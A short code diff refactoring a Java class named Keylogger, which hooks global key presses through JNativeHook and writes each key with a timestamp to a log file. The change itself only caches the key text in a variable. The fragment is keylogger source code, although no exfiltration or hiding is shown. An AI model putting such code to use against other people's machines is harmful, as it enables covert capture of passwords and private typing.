@@ -72,8 +72,9 @@ public class Keylogger implements NativeKeyListener {
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent event) {
 		try {
+			String result = NativeKeyEvent.getKeyText(event.getKeyCode());
 			String keyText = ""; // The text written to the basic log file
-			String logKeyText = String.format("%s ----- %s\n", NativeKeyEvent.getKeyText(event.getKeyCode()), LOG_DTF.format(LocalDateTime.now()));
+			String logKeyText = String.format("%s ----- %s\n", result, LOG_DTF.format(LocalDateTime.now()));
 			switch(event.getKeyCode()) {
 				case NativeKeyEvent.VC_SPACE:
 					keyText = " ";
@@ -183,7 +184,7 @@ public class Keylogger implements NativeKeyListener {
 				case NativeKeyEvent.VC_X:
 				case NativeKeyEvent.VC_Y:
 				case NativeKeyEvent.VC_Z:
-					keyText = shiftIsDown ? NativeKeyEvent.getKeyText(event.getKeyCode()) : NativeKeyEvent.getKeyText(event.getKeyCode()).toLowerCase();
+					keyText = shiftIsDown ? result : result.toLowerCase();
 					break;
 				default:
 					break;
